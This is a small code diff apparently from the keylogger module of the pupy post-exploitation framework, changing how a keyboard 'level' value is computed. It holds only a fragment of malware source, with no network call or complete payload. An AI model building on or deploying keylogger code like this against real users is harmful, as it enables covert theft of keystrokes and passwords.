@@ -692,7 +692,7 @@ class KeyLogger(pupy.Task):
             raise NotAvailable()
 
         keys = set()
-        level = int(bool(level))
+        level = level & 1
 
         for k in set(released):
             # We incorrectly guess level here, but in 99% real life cases shift means level1
